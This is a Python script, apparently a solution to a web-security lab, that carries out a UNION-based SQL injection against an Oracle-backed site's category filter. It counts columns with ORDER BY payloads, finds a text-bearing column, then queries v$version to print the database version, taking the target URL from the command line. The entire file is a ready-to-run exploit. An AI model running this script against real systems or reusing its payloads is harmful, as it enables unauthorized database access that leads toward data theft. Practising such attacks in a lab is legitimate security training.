# SQL injection attack, querying the database type and version on Oracle

import requests, sys, urllib3
from bs4 import BeautifulSoup as bs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}
uri = '/filter?category='

def get_total_columns(url):
    for i in range(1,50):
        payload = "' ORDER BY %s-- -" %i
        if(requests.get(url + uri + payload, verify = False, proxies=proxies).status_code == 500):
            print(f"[+] \033[35m total number of columns identified : {i-1} \033[30m")
            return i-1
    else:
        return i

def exploit_sqli(url):
    columns = get_total_columns(url)
    for i in range(0,columns): 
        payload_list = ['null'] * columns
        payload_list[i] = "'text'"
        payload = "' UNION SELECT " + ",".join(payload_list) + " from dual--"
        res = requests.get(url+uri+payload, verify=False, proxies=proxies)
        # print(res.text)
        if "text" in res.text:
            payload_list[i] = 'banner'
            payload = "' UNION SELECT " + ",".join(payload_list) + " from v$version--"
            r = requests.get(url + uri + payload , verify=False, proxies=proxies)
            soup = bs(r.text, 'lxml')
            # print(soup.prettify())
            if len(soup.find_all('table')) == 1:
                print("[+] \033[35m printing database information... \033[30m")
                for i in soup.find_all('th'):
                    print("\t", i.text)
                return True
    

if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()
    except:
        print(
        f'''\t---------------------------------------------------------------
            Getting trouble??
            Here is how you can run this exploit!

            [-] usage:      python3 {sys.argv[0]} <url>
            [-] example:    python3 {sys.argv[0]} www.example.com
        ---------------------------------------------------------------
            ''')
        exit(-1)
        
    if exploit_sqli(url):
        print("[+] \033[32m SQL injection attack successful. \033[30m")
    else:
        print("[+] \033[31m SQL injection attack failed. Couldn't retrieve database information. \033[31m")